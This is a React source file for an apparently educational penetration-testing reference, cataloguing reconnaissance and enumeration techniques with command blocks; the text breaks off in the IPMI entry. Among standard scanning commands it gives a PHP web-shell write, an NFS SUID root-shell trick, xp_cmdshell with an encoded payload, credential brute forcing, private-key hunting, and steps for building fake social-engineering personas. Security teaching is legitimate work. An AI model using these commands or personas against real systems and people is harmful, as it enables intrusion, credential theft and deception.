import React, { useState } from 'react';
import MapNode from '../components/MapNode';
import AddCardModal from '../components/AddCardModal';
import DraggableCardList from '../components/DraggableCardList';
import { usePageStorage } from '../hooks/usePageStorage';
import { X, Plus } from 'lucide-react';

const initialMapColumns = [
  {
    header: 'OSINT',
    color: 'green',
    nodes: [
      { title: 'SOCK Puppets', subtitle: 'Fake personas • social engineering recon', id: 'sock-puppets' },
      { title: 'DNS Records', subtitle: 'A • MX • TXT • zone transfer • crt.sh', id: 'dns' },
      { title: 'Google Dorks', subtitle: 'site: • filetype: • inurl: • Shodan', id: 'dorks' },
      { title: 'Social Media', subtitle: 'LinkedIn • GitHub • email harvest • breach data', id: 'social' },
    ]
  },
  {
    header: 'SCANNING',
    color: 'orange',
    nodes: [
      { title: 'Port Scanning', subtitle: 'nmap • masscan • rustscan • UDP', id: 'port-scan' },
      { title: 'FTP', subtitle: 'Anonymous login • file enum • version', id: 'ftp' },
      { title: 'SSH', subtitle: 'Version • key auth • user enum', id: 'ssh' },
      { title: 'SMB', subtitle: 'Null session • shares • enum4linux', id: 'smb' },
      { title: 'NFS', subtitle: 'Showmount • no_root_squash • mount', id: 'nfs' },
      { title: 'SMTP', subtitle: 'VRFY • EXPN • mail relay • user enum', id: 'smtp' },
      { title: 'IMAP / POP3', subtitle: 'Login bruteforce • mailbox enum', id: 'imap-pop3' },
      { title: 'SNMP', subtitle: 'Community string • v1/v2 walk • v3', id: 'snmp' },
      { title: 'MySQL', subtitle: 'Auth bypass • UDF • file read/write', id: 'mysql' },
      { title: 'MSSQL', subtitle: 'xp_cmdshell • linked servers • CLR', id: 'mssql' },
      { title: 'Oracle TNS', subtitle: 'SID enum • ODAT • default creds', id: 'oracle' },
      { title: 'IPMI', subtitle: 'Auth bypass • hash dump • cipher 0', id: 'ipmi' },
    ]
  },
  {
    header: 'PACKET CAPTURE',
    color: 'purple',
    nodes: [
      { title: 'Wireshark', subtitle: 'Passive sniff • protocol analysis • cred harvest', id: 'wireshark-recon' },
    ]
  },
  {
    header: 'INTERNAL AD RECON',
    color: 'cyan',
    nodes: [
      { title: 'Domain Recon', subtitle: 'PowerView • SharpView • ADSearch', id: 'domain-recon' },
      { title: 'BloodHound', subtitle: 'SharpHound • ACL analysis • Cypher', id: 'bloodhound' },
    ]
  },
];

const techniques = [
  // ── OSINT ────────────────────────────────────────────────────────────────────
  {
    id: 'sock-puppets',
    title: 'SOCK Puppets — Fake Persona Construction',
    subtitle: 'Build convincing fake online identities to gather intelligence without attribution',
    tags: ['SOCK puppet', 'fake persona', 'OSINT', 'LinkedIn recon', 'social engineering', 'OpSec'],
    accentColor: 'green',
    overview: 'SOCK puppets are fake online personas used to gather target intelligence without revealing the engagement or the operator\'s identity. A convincing persona enables direct interaction with employees, access to insider job listings, and invitation to private communities. They are essential for intelligence gathering on targets with limited public exposure and for building pretext for phishing campaigns.',
    steps: [
      'Create the persona: generate a realistic name, photo (AI-generated face from thispersondoesnotexist.com), and backstory matching the target industry',
      'Register a new email address using a VPN or Tor — never use an address linked to your real identity',
      'Create a LinkedIn profile matching the persona\'s role (recruiter, vendor, IT consultant) — fill it with plausible work history',
      'Age the accounts for at least 1–2 weeks before using them for active intelligence gathering',
      'Connect with real employees of the target organisation on LinkedIn — recruiters and vendors are least suspicious',
      'Use the persona to access job postings (reveals internal stack, security tools, naming conventions), forums, and Slack communities',
      'Never use the persona from your real IP or device — always route through a separate VPN or residential proxy',
    ],
    commands: [
      {
        title: 'SOCK puppet setup and intelligence gathering',
        code: `# AI-generated face (no copyright, does not exist)
# https://thispersondoesnotexist.com — refresh for new face

# Email setup (temporary or dedicated)
# ProtonMail / Tutanota via Tor for anonymity

# LinkedIn reconnaissance via persona
# Target company search → Employees → filter by:
# - Information Technology (reveals IT org chart)
# - Security (reveals security team composition)
# - Recruiting (easiest to connect — recruiters accept all)

# Job posting intelligence gathering
# Job posts reveal:
# - EDR/AV product names (CrowdStrike, SentinelOne)
# - SIEM stack (Splunk, QRadar)
# - Cloud provider (AWS, Azure, GCP)
# - IAM solution (Okta, Azure AD, Ping Identity)
# - Internal naming conventions
# - Org structure and team sizes

# LinkedIn Sales Navigator (paid — full org recon)
# Filters: Company + Department + Seniority
# Exports: name, title, LinkedIn URL for phishing list

# GitHub search via persona
# site:github.com org:TargetCorp
# Reveals: repos, contributor names, internal tools, hardcoded secrets`
      }
    ]
  },
  {
    id: 'dns',
    title: 'DNS Enumeration',
    subtitle: 'Enumerate DNS records to map the target\'s external and internal infrastructure',
    tags: ['nslookup', 'dig', 'zone transfer', 'MX', 'SPF', 'DKIM', 'subfinder', 'crt.sh'],
    accentColor: 'green',
    overview: 'DNS is the internet\'s phone book — every service the target exposes requires a DNS record. Enumerating A, MX, TXT, NS, and CNAME records reveals mail servers, cloud providers, IP ranges, email security configuration, and subdomains. A successful AXFR zone transfer dumps the entire zone file. Passive subdomain enumeration via certificate transparency logs and SecurityTrails finds subdomains without querying the target\'s DNS servers directly.',
    steps: [
      'Query A records for the root domain and www to identify primary IP ranges',
      'Query MX records to identify mail server infrastructure',
      'Query TXT records for SPF/DKIM/DMARC — reveals email security posture and cloud services (O365, G Suite)',
      'Query NS records to identify authoritative nameservers, then attempt AXFR against each',
      'Enumerate subdomains passively via certificate transparency: curl crt.sh',
      'Run subfinder and amass for active + passive subdomain enumeration from multiple data sources',
      'Resolve all discovered subdomains to IPs with dnsx and add to scope for service scanning',
    ],
    commands: [
      {
        title: 'DNS record enumeration',
        code: `# Basic DNS queries
dig target.com A
dig target.com MX
dig target.com TXT
dig target.com NS
dig target.com ANY

# Zone transfer attempt
dig axfr target.com @ns1.target.com

# Certificate transparency — passive subdomain discovery
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sort -u

# Subfinder — multi-source subdomain enumeration
subfinder -d target.com -silent -all -o subs.txt

# amass passive enum
amass enum -passive -d target.com -o amass_output.txt

# Resolve discovered subdomains
cat subs.txt | dnsx -silent -a -resp

# theHarvester — email/subdomain/employee enumeration
theHarvester -d target.com -l 500 -b google,bing,linkedin,shodan`
      }
    ]
  },
  {
    id: 'dorks',
    title: 'Google Dorks & Shodan',
    subtitle: 'Use search engine operators to discover sensitive files, login panels, and exposed data',
    tags: ['Google Dorks', 'Shodan', 'OSINT', 'site:', 'filetype:', 'inurl:', 'Censys', 'FOFA'],
    accentColor: 'green',
    overview: 'Google Dorks use advanced search operators to surface content indexed by search engines that the target did not intend to expose — backup files, admin portals, password-containing documents, and directory listings. Shodan scans the entire internet and indexes service banners, TLS certificates, and HTTP headers, providing a real-time view of a target\'s exposed services. GitHub dorking finds leaked API keys, credentials, and internal code committed to public repos.',
    steps: [
      'Start with site:target.com to enumerate all indexed pages, then narrow with filetype: and inurl:',
      'Search for sensitive file types: filetype:xlsx OR filetype:csv OR filetype:env OR filetype:sql',
      'Find admin/login panels: site:target.com inurl:admin OR inurl:portal OR inurl:login',
      'Find directory listings: intitle:"index of" site:target.com',
      'Run Shodan searches against the target org and IP ranges to find internet-facing services with version banners',
      'Search GitHub for leaked secrets: "target.com" password / api_key / secret_key',
      'Use Censys and FOFA as Shodan alternatives for additional coverage',
    ],
    commands: [
      {
        title: 'Google dorks and Shodan queries',
        code: `# Google Dorks
site:target.com
site:target.com filetype:pdf
site:target.com filetype:xlsx OR filetype:csv OR filetype:env
site:target.com inurl:admin OR inurl:login OR inurl:portal
site:target.com intitle:"index of"
site:target.com "internal use only"
site:target.com "username" OR "password" filetype:txt
site:target.com -www    # Exclude main domain — find subdomains

# Shodan queries
shodan search "ssl.cert.subject.cn:target.com"
shodan search "org:Target Corporation"
shodan search "http.title:target.com"
shodan search "hostname:target.com" --fields ip_str,port,org,product

# Shodan CLI enumeration
shodan init YOUR_API_KEY
shodan search 'org:"Target Corp"' --fields ip_str,port,product,version
shodan search 'org:"Target Corp" product:"Pulse Secure"'
shodan search 'org:"Target Corp" http.title:"Citrix Gateway"'
shodan search 'org:"Target Corp" port:3389'

# GitHub dorking
# site:github.com "target.com" password
# site:github.com "target.com" api_key
# site:github.com "target.com" secret`
      }
    ]
  },
  {
    id: 'social',
    title: 'Social Media & Employee OSINT',
    subtitle: 'Enumerate employees, roles, and technologies from public sources for targeting',
    tags: ['LinkedIn', 'GitHub', 'email harvesting', 'employee enum', 'HaveIBeenPwned', 'Hunter.io'],
    accentColor: 'green',
    overview: 'Employee OSINT builds the target list for phishing and password spraying while revealing the organisation\'s technology stack. LinkedIn profiles expose org charts, names, titles, and roles. Job postings reveal security products deployed. GitHub commits expose internal endpoints, API keys, and infrastructure patterns. Cross-referencing names against breach databases yields candidate passwords for credential stuffing.',
    steps: [
      'Search LinkedIn for the target company and enumerate IT staff, C-suite, finance, and security teams by title',
      'Determine the corporate email format from discovered profiles or Hunter.io API lookup',
      'Generate email permutations for all discovered names using namemash.py',
      'Search GitHub for "target.com" in code to find leaked API keys, internal URLs, and configuration files',
      'Cross-reference discovered emails against HaveIBeenPwned API and dehashed.com for breached passwords',
      'Review job postings for mentions of specific security products (EDR, SIEM, IAM) — informs evasion planning',
      'Build a final target list: name, email, role, department — used for phishing and spray targeting',
    ],
    commands: [
      {
        title: 'Employee and email enumeration',
        code: `# Hunter.io — email format discovery
curl "https://api.hunter.io/v2/domain-search?domain=target.com&api_key=KEY"
# Returns: firstname.lastname@target.com pattern + real emails

# Email permutation generator
python3 -c "
names = [('john','smith'), ('jane','doe')]
domain = 'target.com'
for fn, ln in names:
    for fmt in [f'{fn}.{ln}', f'{fn[0]}{ln}', f'{fn}_{ln}', f'{ln}.{fn}']:
        print(f'{fmt}@{domain}')
"

# GitHub secrets search
trufflehog github --org=TargetCorp --json
gitleaks detect --source . -v

# HaveIBeenPwned API
curl -H "hibp-api-key: KEY" https://haveibeenpwned.com/api/v3/breachedaccount/target@target.com

# LinkedIn OSINT (manual)
# Search: site:linkedin.com "target company" "information technology"

# theHarvester — aggregate emails from multiple sources
theHarvester -d target.com -l 500 -b google,bing,linkedin`
      }
    ]
  },

  // ── SCANNING ─────────────────────────────────────────────────────────────────
  {
    id: 'port-scan',
    title: 'Port Scanning & Host Discovery',
    subtitle: 'Enumerate open ports and live hosts across internal and external network ranges',
    tags: ['nmap', 'masscan', 'rustscan', 'host discovery', 'ping sweep', 'SYN scan', 'UDP scan'],
    accentColor: 'orange',
    overview: 'Port scanning maps open TCP/UDP ports on live hosts, revealing the services exposed by the target. masscan performs full /16 sweeps in minutes via async packet sending, then nmap provides accurate service version detection and scripted enumeration. For internal post-compromise scanning, rustscan or the Cobalt Strike port-scan BOF avoids spawning an nmap process.',
    steps: [
      'Run a ping sweep to identify live hosts: nmap -sn 10.10.10.0/24',
      'Use masscan for fast full-port discovery across large ranges',
      'Feed masscan\'s open-port output to nmap for accurate service version detection',
      'Run nmap NSE scripts for key services: smb-enum-shares, smb-vuln-ms17-010, ldap-rootdse',
      'Scan key UDP ports separately: 53, 161, 123, 500',
      'From a beacon: use the CS portscan BOF or proxychains nmap -sT',
      'Save all output in grepable format (-oG) and Nmap XML (-oX) for tool import',
    ],
    commands: [
      {
        title: 'Host discovery and fast port scanning',
        code: `# Ping sweep — find live hosts
nmap -sn 10.10.10.0/24 -oG hosts_up.txt
arp-scan --localnet

# masscan — ultra-fast full port scan
masscan -p1-65535 10.10.10.0/24 --rate=1000 -oL masscan_out.txt

# rustscan — async fast scan + nmap handoff
rustscan -a 10.10.10.0/24 --range 1-65535 -- -sV -sC

# nmap comprehensive
nmap -sS -p- 10.10.10.5 -T4 -oN full_tcp.txt
nmap -sU -p 53,161,123,69,500 10.10.10.5
nmap -sV -sC -p22,80,443,445,3389 10.10.10.5 -oA nmap_result

# Service-specific NSE scripts
nmap -p445 --script smb-enum-shares,smb-enum-users,smb-os-discovery 10.10.10.0/24
nmap -p445 --script smb-vuln-ms17-010 10.10.10.0/24
nmap -p389 --script ldap-rootdse 10.10.10.5

# Internal scan from CS beacon
portscan 10.10.10.0/24 1-1024,3389,5985,8080 icmp 1024

# Via proxychains
proxychains nmap -sT -Pn -p22,80,445,3389,5985 10.10.10.0/24`
      }
    ]
  },
  {
    id: 'ftp',
    title: 'FTP Enumeration',
    subtitle: 'Enumerate FTP services for anonymous access, file listings, and version fingerprinting',
    tags: ['FTP', 'anonymous login', 'vsftpd', 'ProFTPD', 'file enum', '21'],
    accentColor: 'orange',
    overview: 'FTP (port 21) is a legacy file transfer protocol often found in internal networks and older internet-facing servers. Anonymous login allows unauthenticated access to file listings, sometimes exposing sensitive data. Service version disclosure enables targeted CVE exploitation (vsftpd 2.3.4 backdoor, ProFTPD mod_copy).',
    steps: [
      'Scan for FTP with nmap and identify the service version',
      'Attempt anonymous login: username anonymous, password anonymous@',
      'Enumerate directory listings and download any accessible files',
      'Check for writable directories — upload a webshell if the FTP root is web-accessible',
      'Cross-reference version against known CVEs (vsftpd 2.3.4, ProFTPD mod_copy)',
    ],
    commands: [
      {
        title: 'FTP enumeration and exploitation',
        code: `# nmap FTP scan
nmap -p21 --script ftp-anon,ftp-banner,ftp-syst,ftp-vuln-cve2010-4221 10.10.10.5

# Anonymous FTP login
ftp 10.10.10.5
# Username: anonymous
# Password: anonymous@

# FTP commands
ftp> ls -la        # List files
ftp> cd /pub       # Navigate
ftp> get file.txt  # Download file
ftp> mget *        # Download all files
ftp> put shell.php # Upload (if writable)

# Binary mode transfer (important for executables)
ftp> binary
ftp> get tool.exe

# curl FTP
curl -s --user anonymous:anonymous@ ftp://10.10.10.5/
curl -s ftp://10.10.10.5/file.txt --user anonymous:

# vsftpd 2.3.4 backdoor (CVE-2011-2523)
nmap -p21 --script ftp-vsftpd-backdoor 10.10.10.5
# Connect on 6200 after triggering: nc 10.10.10.5 6200

# ProFTPD mod_copy (CVE-2015-3306)
nc 10.10.10.5 21
SITE CPFR /etc/passwd
SITE CPTO /var/www/html/passwd.txt`
      }
    ]
  },
  {
    id: 'ssh',
    title: 'SSH Enumeration',
    subtitle: 'Fingerprint SSH, enumerate users, and identify weak configurations',
    tags: ['SSH', 'version', 'user enumeration', 'key auth', 'authorized_keys', 'timing attack'],
    accentColor: 'orange',
    overview: 'SSH (port 22) is the primary remote management protocol on Linux/Unix systems. Version fingerprinting reveals potentially vulnerable implementations. Username enumeration via timing differences on older OpenSSH versions can validate targets for password spraying. Finding SSH private keys in backup files or git repos provides direct access.',
    steps: [
      'Scan port 22 and enumerate the SSH server version banner',
      'Attempt user enumeration on older OpenSSH versions (CVE-2018-15473)',
      'Search for private keys on disk, in git repos, and in backup archives',
      'Test default credentials on IoT/embedded devices',
      'Check for authorized_keys files and agent forwarding misconfigurations',
    ],
    commands: [
      {
        title: 'SSH enumeration',
        code: `# nmap SSH scan
nmap -p22 --script ssh-auth-methods,ssh-hostkey,ssh-run 10.10.10.5

# Banner grab
nc -nv 10.10.10.5 22
ssh -V 10.10.10.5   # Version check

# Username enumeration (OpenSSH < 7.7 — CVE-2018-15473)
git clone https://github.com/Sait-Nuri/CVE-2018-15473
python3 ssh_user_enum.py --userList users.txt --address 10.10.10.5

# Password brute force (use sparingly — lockout risk)
hydra -L users.txt -P passwords.txt 10.10.10.5 ssh -t 4

# SSH with key
ssh -i id_rsa user@10.10.10.5

# Find SSH private keys in common locations
find / -name "id_rsa*" -o -name "id_ecdsa*" -o -name "id_ed25519*" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# Check SSH config for misconfigs
cat /etc/ssh/sshd_config | grep -iE "PermitRootLogin|PasswordAuthentication|AuthorizedKeysFile"`
      }
    ]
  },
  {
    id: 'smb',
    title: 'SMB Enumeration',
    subtitle: 'Enumerate SMB shares, users, and OS info via null session and authenticated queries',
    tags: ['SMB', 'null session', 'enum4linux', 'crackmapexec', 'smbclient', 'SMB signing'],
    accentColor: 'orange',
    overview: 'SMB (ports 139/445) is the Windows file sharing protocol and a rich source of intelligence. Null sessions allow unauthenticated enumeration of shares, users, and password policy on misconfigured systems. CrackMapExec sweeps entire subnets in one command. Identifying hosts without SMB signing is critical for NTLM relay attacks.',
    steps: [
      'Scan for SMB and identify OS version and signing status',
      'Attempt null session share enumeration',
      'Run enum4linux-ng for comprehensive SMB/LDAP enumeration',
      'Use crackmapexec for subnet-wide SMB sweeps',
      'Identify hosts without SMB signing for relay attacks',
      'If authenticated: enumerate users, groups, password policy, and shares',
    ],
    commands: [
      {
        title: 'SMB enumeration',
        code: `# nmap SMB scans
nmap -p445 --script smb-enum-shares,smb-enum-users,smb-os-discovery 10.10.10.5
nmap -p445 --script smb-vuln-ms17-010 10.10.10.0/24
nmap -p445 --script smb2-security-mode 10.10.10.0/24   # Signing check

# enum4linux-ng — comprehensive enumeration
enum4linux-ng -A 10.10.10.5

# CrackMapExec — subnet sweep
crackmapexec smb 10.10.10.0/24                              # OS/hostname
crackmapexec smb 10.10.10.5 --shares                       # List shares (anon)
crackmapexec smb 10.10.10.5 -u '' -p '' --shares           # Null session
crackmapexec smb 10.10.10.5 -u user -p pass --users        # Enum users
crackmapexec smb 10.10.10.5 -u user -p pass --pass-pol     # Password policy
crackmapexec smb 10.10.10.0/24 --gen-relay-list relay_targets.txt

# smbclient
smbclient -L //10.10.10.5 -N                    # Null session
smbclient //10.10.10.5/SHARE -N                 # Connect anonymously
smbclient //10.10.10.5/SHARE -U user%pass       # Authenticated

# rpcclient — null session user/group enum
rpcclient -U "" -N 10.10.10.5
  enumdomusers    # List domain users
  enumdomgroups   # List domain groups
  getdompwinfo    # Password policy`
      }
    ]
  },
  {
    id: 'nfs',
    title: 'NFS Enumeration',
    subtitle: 'Discover NFS exports and abuse no_root_squash for privilege escalation',
    tags: ['NFS', 'showmount', 'mount', 'no_root_squash', 'exports', '2049'],
    accentColor: 'orange',
    overview: 'NFS (port 2049) shares are frequently misconfigured with overly permissive exports. The no_root_squash option is particularly dangerous — it allows a remote root user to access files as root on the NFS mount, enabling SUID binary planting for privilege escalation.',
    steps: [
      'Scan for NFS with nmap and list available exports with showmount',
      'Mount any accessible shares and enumerate their contents',
      'Check export options — no_root_squash allows full root access',
      'If no_root_squash: create a SUID bash binary on the share from the attacking machine as root',
      'Execute the SUID binary from the target system to escalate to root',
    ],
    commands: [
      {
        title: 'NFS enumeration and exploitation',
        code: `# nmap NFS scan
nmap -p111,2049 --script nfs-ls,nfs-showmount,nfs-statfs 10.10.10.5

# List exports
showmount -e 10.10.10.5

# Mount export
mkdir /mnt/nfs_mount
mount -t nfs 10.10.10.5:/share /mnt/nfs_mount
ls -la /mnt/nfs_mount

# Check /etc/exports options (from target if compromised)
cat /etc/exports
# Look for: no_root_squash, no_all_squash

# Exploit no_root_squash (from attacker machine as root)
# On ATTACKER (as root):
cp /bin/bash /mnt/nfs_mount/bash_suid
chmod +s /mnt/nfs_mount/bash_suid    # Set SUID bit

# On TARGET (as low-priv user):
/mnt/nfs_mount/bash_suid -p           # -p preserves EUID — gives root shell

# Unmount
umount /mnt/nfs_mount`
      }
    ]
  },
  {
    id: 'smtp',
    title: 'SMTP Enumeration',
    subtitle: 'Enumerate mail users and test for open relays via VRFY/EXPN commands',
    tags: ['SMTP', 'VRFY', 'EXPN', 'user enumeration', 'open relay', '25', '587'],
    accentColor: 'orange',
    overview: 'SMTP (ports 25/587/465) is the mail transfer protocol. VRFY and EXPN commands enumerate valid users on misconfigured mail servers. Open relays allow sending mail as any sender. Version fingerprinting identifies exploitable mail server CVEs.',
    steps: [
      'Scan SMTP and grab the service banner for version information',
      'Test VRFY command to enumerate valid local users',
      'Test EXPN to expand mailing list aliases',
      'Test for open relay — attempt to send mail from an external domain via the server',
      'Use smtp-user-enum for automated user enumeration',
    ],
    commands: [
      {
        title: 'SMTP enumeration',
        code: `# nmap SMTP scan
nmap -p25,587 --script smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344 10.10.10.5

# Banner grab
nc -nv 10.10.10.5 25

# VRFY — user enumeration (manual)
VRFY root
VRFY admin
VRFY john.smith

# EXPN — list expansion
EXPN developers

# smtp-user-enum — automated
smtp-user-enum -M VRFY -U users.txt -t 10.10.10.5
smtp-user-enum -M RCPT -U users.txt -t 10.10.10.5

# Open relay test (manual)
telnet 10.10.10.5 25
HELO test.com
MAIL FROM: <attacker@evil.com>
RCPT TO: <victim@internal.corp>
DATA
Subject: Open Relay Test
Test message
.
QUIT

# swaks — SMTP test tool
swaks --to victim@target.com --from attacker@evil.com --server 10.10.10.5`
      }
    ]
  },
  {
    id: 'imap-pop3',
    title: 'IMAP / POP3 Enumeration',
    subtitle: 'Enumerate mail services and brute-force mailbox credentials',
    tags: ['IMAP', 'POP3', '143', '993', '110', '995', 'mail enum', 'brute force'],
    accentColor: 'orange',
    overview: 'IMAP (143/993) and POP3 (110/995) provide access to individual mailboxes. Brute-forcing these services with discovered email addresses can yield credential access to corporate email, which often also provides SSO access to other internal services.',
    steps: [
      'Scan for IMAP and POP3 ports and identify the mail server software',
      'Test plain-text and SSL variants',
      'Brute-force with discovered email addresses and password lists',
      'If access gained: read emails for sensitive information (passwords, internal docs, tokens)',
    ],
    commands: [
      {
        title: 'IMAP/POP3 enumeration',
        code: `# nmap scan
nmap -p110,143,993,995 --script imap-capabilities,pop3-capabilities 10.10.10.5

# Manual IMAP connection
nc -nv 10.10.10.5 143
# SSL version
openssl s_client -connect 10.10.10.5:993

# IMAP commands
a1 LOGIN user@target.com password
a2 LIST "" "*"       # List mailboxes
a3 SELECT INBOX      # Select inbox
a4 SEARCH ALL        # List all message IDs
a5 FETCH 1 BODY[]    # Fetch first message
a6 LOGOUT

# POP3 commands
nc -nv 10.10.10.5 110
USER user@target.com
PASS password
LIST           # List messages
RETR 1         # Retrieve message 1
QUIT

# Brute force with hydra
hydra -L emails.txt -P passwords.txt 10.10.10.5 imap
hydra -L emails.txt -P passwords.txt 10.10.10.5 pop3`
      }
    ]
  },
  {
    id: 'snmp',
    title: 'SNMP Enumeration',
    subtitle: 'Enumerate device information, running processes, and network config via SNMP community strings',
    tags: ['SNMP', 'community string', 'snmpwalk', 'onesixtyone', 'v1/v2c', 'v3', '161'],
    accentColor: 'orange',
    overview: 'SNMP (UDP 161) provides device management information including running processes, network interfaces, installed software, and user accounts. Version 1 and 2c use cleartext community strings (often "public" or "private"). A writable community string enables configuration changes. SNMPv3 uses proper authentication but is still worth enumerating.',
    steps: [
      'Scan UDP 161 and identify SNMP versions supported',
      'Try default community strings: public, private, community, manager',
      'Use onesixtyone for fast community string brute-force',
      'Walk the MIB tree to enumerate system info, processes, interfaces, and users',
      'If writable community string found: test configuration modification',
    ],
    commands: [
      {
        title: 'SNMP enumeration',
        code: `# nmap SNMP scan (UDP)
nmap -sU -p161 --script snmp-brute,snmp-info,snmp-sysdescr,snmp-win32-users 10.10.10.5

# onesixtyone — community string bruteforce
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 10.10.10.5

# snmpwalk — enumerate entire MIB
snmpwalk -v2c -c public 10.10.10.5
snmpwalk -v2c -c public 10.10.10.5 1.3.6.1.2.1.25.4.2.1.2   # Running processes
snmpwalk -v2c -c public 10.10.10.5 1.3.6.1.2.1.25.6.3.1.2   # Installed software
snmpwalk -v2c -c public 10.10.10.5 1.3.6.1.4.1.77.1.2.25    # Windows users
snmpwalk -v2c -c public 10.10.10.5 1.3.6.1.2.1.4.34         # Network interfaces

# snmpget — specific OID
snmpget -v2c -c public 10.10.10.5 sysDescr.0

# snmpset — write test (if writable community)
snmpset -v2c -c private 10.10.10.5 sysContact.0 s "attacker@evil.com"

# SNMPv3 enumeration (if v3 in use)
snmpwalk -v3 -u admin -l authPriv -a MD5 -A password -x DES -X privpass 10.10.10.5`
      }
    ]
  },
  {
    id: 'mysql',
    title: 'MySQL Enumeration',
    subtitle: 'Enumerate MySQL databases, users, and escalate via UDF or file read/write',
    tags: ['MySQL', '3306', 'default creds', 'UDF', 'LOAD DATA INFILE', 'SELECT INTO OUTFILE'],
    accentColor: 'orange',
    overview: 'MySQL (port 3306) is the most common database in web applications. Default or weak credentials are frequent. Privileged MySQL access enables reading arbitrary files (LOAD DATA INFILE), writing web shells (SELECT INTO OUTFILE), and escalating to OS command execution via User-Defined Functions (UDF).',
    steps: [
      'Scan port 3306 and attempt default credentials (root with no password, root/root)',
      'Enumerate databases, tables, and users after authentication',
      'Test file read with LOAD DATA INFILE to read /etc/passwd',
      'Test file write with SELECT INTO OUTFILE to drop a webshell in the web root',
      'Escalate via UDF if FILE privilege is available',
    ],
    commands: [
      {
        title: 'MySQL enumeration and exploitation',
        code: `# nmap MySQL scan
nmap -p3306 --script mysql-info,mysql-empty-password,mysql-databases,mysql-users 10.10.10.5

# Connect
mysql -h 10.10.10.5 -u root -p
mysql -h 10.10.10.5 -u root    # No password attempt

# Enumerate
show databases;
use information_schema;
select user,host,authentication_string from mysql.user;
show grants for 'root'@'localhost';

# File read (requires FILE privilege)
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/var/www/html/config.php');

# Write webshell (if FILE privilege + writable web root)
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';

# UDF escalation (Linux — if FILE privilege)
# Compile udf.so on attacker, upload via SELECT...INTO DUMPFILE
# CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'udf.so';
# SELECT sys_exec('id');

# MySQL via sqlmap
sqlmap -u "http://target.com/page?id=1" --dbms=mysql --dump`
      }
    ]
  },
  {
    id: 'mssql',
    title: 'MSSQL Enumeration',
    subtitle: 'Enumerate MSSQL instances, execute OS commands via xp_cmdshell, and abuse linked servers',
    tags: ['MSSQL', 'MSSQL 1433', 'xp_cmdshell', 'linked servers', 'CLR', 'Impacket', 'PowerUpSQL'],
    accentColor: 'orange',
    overview: 'MSSQL (port 1433) is Microsoft\'s enterprise database. sysadmin access enables OS command execution via xp_cmdshell. Linked servers allow lateral movement to other MSSQL instances with different trust levels. CLR assemblies provide another OS execution path when xp_cmdshell is disabled.',
    steps: [
      'Scan for MSSQL and attempt Windows authentication or sa with common passwords',
      'Check if xp_cmdshell is enabled or can be enabled',
      'Enumerate linked servers for lateral movement opportunities',
      'If xp_cmdshell disabled: enable it with sp_configure, or use CLR assemblies',
      'Use impacket mssqlclient or PowerUpSQL for comprehensive MSSQL testing',
    ],
    commands: [
      {
        title: 'MSSQL enumeration and exploitation',
        code: `# nmap MSSQL scan
nmap -p1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell 10.10.10.5

# Impacket mssqlclient — Windows auth
python3 mssqlclient.py DOMAIN/user:pass@10.10.10.5 -windows-auth

# SQL auth
python3 mssqlclient.py sa:password@10.10.10.5

# Enable and use xp_cmdshell
SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
SQL> EXEC xp_cmdshell 'whoami';
SQL> EXEC xp_cmdshell 'powershell -enc BASE64_PAYLOAD';

# Enum databases and linked servers
SQL> SELECT name FROM master.dbo.sysdatabases;
SQL> SELECT * FROM sys.servers;
SQL> EXEC sp_linkedservers;

# Execute on linked server
SQL> EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SERVER_NAME];

# PowerUpSQL — automated MSSQL auditing
Import-Module PowerUpSQL.ps1
Get-SQLInstanceDomain | Get-SQLServerInfo
Invoke-SQLAudit -Instance target\SQLEXPRESS
Invoke-SQLEscalatePriv -Instance target\SQLEXPRESS`
      }
    ]
  },
  {
    id: 'oracle',
    title: 'Oracle TNS Enumeration',
    subtitle: 'Enumerate Oracle database SIDs, test default credentials, and exploit with ODAT',
    tags: ['Oracle', 'TNS', '1521', 'SID enum', 'ODAT', 'default creds', 'tnscmd'],
    accentColor: 'orange',
    overview: 'Oracle TNS Listener (port 1521) is Oracle\'s database connectivity protocol. SID (System Identifier) enumeration reveals accessible database instances. ODAT (Oracle Database Attacking Tool) automates credential testing, file read/write, and OS command execution.',
    steps: [
      'Scan port 1521 and enumerate Oracle version',
      'Enumerate SIDs using tnscmd or nmap scripts',
      'Test default credentials: sys/change_on_install, system/manager, dbsnmp/dbsnmp',
      'Use ODAT for comprehensive Oracle attack automation',
      'If DBA access: use UTL_FILE for file read, or Java stored procedures for OS execution',
    ],
    commands: [
      {
        title: 'Oracle TNS enumeration',
        code: `# nmap Oracle scan
nmap -p1521 --script oracle-sid-brute,oracle-enum-users 10.10.10.5

# tnscmd — interact with TNS listener
tnscmd10g status -h 10.10.10.5
tnscmd10g version -h 10.10.10.5

# SID enumeration with nmap
nmap -p1521 --script oracle-sid-brute \\
  --script-args oracle-sid-brute.sidfile=sids.txt 10.10.10.5

# ODAT — automated Oracle attack tool
# Install: pip install odat
odat all -s 10.10.10.5 -p 1521    # Run all modules
odat sidguesser -s 10.10.10.5     # SID enumeration
odat passwordguesser -s 10.10.10.5 -d XE  # Password guessing

# Common default credentials to test
# sys / change_on_install
# system / manager
# dbsnmp / dbsnmp
# scott / tiger

# sqlplus connection (requires Oracle client)
sqlplus sys/password@10.10.10.5/XE as sysdba

# File read (as DBA)
SQL> SELECT * FROM sys.all_directories;
SQL> CREATE OR REPLACE DIRECTORY dir AS '/etc';
SQL> SELECT UTL_FILE.GET_LINE(UTL_FILE.FOPEN('dir','passwd','R'),1) FROM DUAL;`
      }
    ]
  },
  {
    id: 'ipmi',
    title: 'IPMI Enumeration',
    subtitle: 'Exploit IPMI authentication bypass to dump password hashes without credentials',
    tags: ['IPMI', 'BMC', '623/UDP', 'Cipher 0', 'hash dump', 'RAKP', 'ipmitool'],
    accentColor: 'orange',
